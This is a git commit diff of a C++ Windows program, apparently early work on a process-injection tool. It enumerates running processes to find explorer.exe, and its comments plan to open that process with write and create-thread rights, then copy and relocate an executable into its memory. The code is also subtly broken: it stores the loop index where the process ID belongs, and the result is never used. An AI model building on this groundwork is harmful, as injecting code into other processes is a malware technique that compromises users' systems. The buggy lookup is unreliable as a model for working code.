59a96e7a5ee45d5d50e5fea7af2cecb3de39d2ea
frank2 <frank2@dc949.org>
2024-12-15 02:23:18 -0800

    see if this will properly query the pids

--- main.cpp
+++ main.cpp
@@ -8,13 +8,43 @@
 
 int main(void *formal) {
    /* enum processes and get pid tied to explorer.exe */
-   DWORD proc_array_bytes = 0;
-   EnumProcesses(nullptr, 0, &proc_array_bytes);
-
-   proc_array_bytes += sizeof(DWORD) * 16;
-   
+   DWORD proc_array_bytes = sizeof(DWORD) * 1024;
    DWORD *proc_array = (DWORD *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, proc_array_bytes);
-   EnumProcesses(proc_array, proc_array_bytes, &proc_array_bytes);
+   DWORD proc_array_needed;
+   EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed);
+
+   if (proc_array_needed > proc_array_bytes) {
+      proc_array = (DWORD *)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, proc_array, proc_array_needed);
+      proc_array_bytes = proc_array_needed;
+      EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed);
+   }
+
+   std::size_t pids = proc_array_needed / sizeof(DWORD);
+
+   for (std::size_t i=0; i<pids; ++i) {
+      HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, proc_array[i]);
+
+      if (proc == NULL)
+         continue;
+
+      char filename[MAX_PATH+1];
+      std::memset(&filename[0], 0, MAX_PATH+1);
+      DWORD filename_size = GetModuleFileNameExA(proc, nullptr, &filename[0], MAX_PATH);
+
+      std::size_t j=filename_size;
+      
+      for (j; j!=0; --j)
+         if (filename[j] == '\\')
+            break;
+
+      ++j;
+
+      if (std::strncmp(&filename[j], "explorer.exe", std::strlen("explorer.exe")) == 0) {
+         DWORD found_pid = i;
+         break;
+      }
+   }
+      
    /* open pid with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE
     * allocate space for our executable
     * copy the executable in memory and relocate it to the allocated base
